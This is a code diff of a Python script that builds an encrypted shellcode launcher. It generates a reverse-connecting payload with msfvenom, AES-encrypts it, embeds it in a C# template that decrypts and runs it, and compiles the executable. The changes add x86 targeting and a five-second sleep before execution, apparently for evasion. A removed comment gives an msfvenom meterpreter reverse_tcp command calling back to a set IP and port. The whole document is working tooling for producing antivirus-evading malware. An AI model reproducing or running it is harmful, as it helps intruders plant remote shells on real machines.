@@ -1,4 +1,7 @@
 #!/usr/bin/env python3
+import array, base64
+from Crypto.Cipher import AES
+from hashlib import sha256
 import argparse, subprocess, os
 
 def main():
@@ -13,41 +16,23 @@ def main():
 	print("[+] Generating MSFVENOM payload...")
 	result = subprocess.run(['msfvenom',
 		'-p', payload,
+		'-a', 'x86',
 		'LPORT=' + lport,
 		'LHOST=' + lhost,
-		'-f', 'csharp'],
+		'-f', 'raw'],
 		capture_output=True)
+	buf = result.stdout
 
-	buf = result.stdout.decode('utf-8')
-
-	''' insert buf into template'''
-	print("[+] Generating encryptor.cs file...")
-	template = get_encryptor_template()
-	template = template.replace('~BUF~', buf)
-	template =  template.replace('~KEY~', key)
-
-	'''save template to .cs file'''
-	f = open("./encryptor.cs", "w")
-	f.write(template)
-	f.close()
-
-	'''compile file'''
-	print("[+] Compiling the encryptor...")
-	os.system("mcs ./encryptor.cs /out:encryptor.exe>/dev/null");
-
-	'''run the file'''
-	print("[+] Running the encryptor...")
-	os.system("mono ./encryptor.exe");
-	result = subprocess.run(['mono',
-		'./encryptor.exe'],
-		capture_output=True)
-
-	base64 = result.stdout.decode('utf-8').replace('\n','')
+	''' encrypt the payload '''
+	print("[+] Encrypting the payload...")
+	hkey = hash_key(key)
+	encrypted = encrypt(hkey, hkey[:16], buf)
+	b64 = base64.b64encode(encrypted)
 
 	''' change template '''
 	print("[+] Generating launcher.cs file...")
 	template = get_decryptor_template()
-	template = template.replace('~BASE64~', base64)
+	template = template.replace('~BASE64~', b64.decode('utf-8'))
 	template =  template.replace('~KEY~', key)
 
 	'''save template to .cs file'''
@@ -57,10 +42,38 @@ def main():
 
 	'''compile file'''
 	print("[+] Compiling the launcher...")
-	os.system("mcs ./launcher.cs /out:./" + filename  + ">/dev/null");
+	os.system("mcs /platform:x86 ./launcher.cs /out:./" + filename  + ">/dev/null");
 
 	print("[+] Launcher compiled and written to ./" + filename)
 	print("[+] Have a nice day!")
+
+def encrypt(key,iv,plaintext):
+	key_length = len(key)
+	if (key_length >= 32):
+		k = key[:32]
+	elif (key_length >= 24):
+		k = key[:24]
+	else:
+		k = key[:16]
+
+	aes = AES.new(k, AES.MODE_CBC, iv)
+	pad_text = pad(plaintext, 16)
+	return aes.encrypt(pad_text)
+
+def hash_key(key):
+	h = ''
+	for c in key:
+		h += hex(ord(c)).replace("0x", "")
+	h = bytes.fromhex(h)
+	hashed = sha256(h).digest()
+	return hashed
+
+def pad(data, block_size):
+	padding_size = (block_size - len(data)) % block_size
+	if padding_size == 0:
+		padding_size = block_size
+	padding = (bytes([padding_size]) * padding_size)
+	return data + padding
 
 def parse_args():
 	parser = argparse.ArgumentParser()
@@ -77,66 +90,6 @@ def parse_args():
 		help="The filename of the executable.")
 
 	return parser.parse_args()
-
-def get_encryptor_template():
-	return '''
-using System;
-using System.Security.Cryptography;
-using System.Text;
-using System.IO;
-
-namespace Launcher
-{
-    static class Program
-    {
-        static void Main()
-        {
-            // replace with your own shellcode
-            // e.g. msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=443 LHOST=10.10.14.5 -f csharp
-            ~BUF~
-
-            // remember to use your own key to encrypt the shellcode
-            string b64 = Encrypt("~KEY~", buf);
-            Console.WriteLine(b64);
-        }
-
-        static string Encrypt(string key, byte[] data)
-        {
-            byte[] tempKey = Encoding.UTF8.GetBytes(key);
-            tempKey = SHA256.Create().ComputeHash(tempKey);
-
-            // encrypt data
-            Aes aes = new AesManaged();
-            aes.Mode = CipherMode.CBC;
-            aes.Padding = PaddingMode.PKCS7;
-            ICryptoTransform enc = aes.CreateEncryptor(tempKey, SubArray(tempKey, 16));
-
-            using (MemoryStream msEncrypt = new MemoryStream())
-            {
-                using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, enc, CryptoStreamMode.Write))
-                {
-                    csEncrypt.Write(data, 0, data.Length);
-                    csEncrypt.FlushFinalBlock();
-
-                    return Convert.ToBase64String(msEncrypt.ToArray());
-                }
-            }
-        }
-
-        static byte[] SubArray(byte[] a, int length)
-        {
-            byte[] b = new byte[length];
-            for (int i = 0; i < length; i++)
-            {
-                b[i] = a[i];
-            }
-            return b;
-        }
-    }
-}
-
-
-'''
 
 def get_decryptor_template():
 	return '''
@@ -188,6 +141,9 @@ namespace Launcher
 
             // remember to change the encryption key!
             byte[] dec_shellcode = Decrypt("~KEY~", shellcodeb64);
+
+						System.Threading.Thread.Sleep(5000);
+
             RunShellcode(dec_shellcode);
         }
 
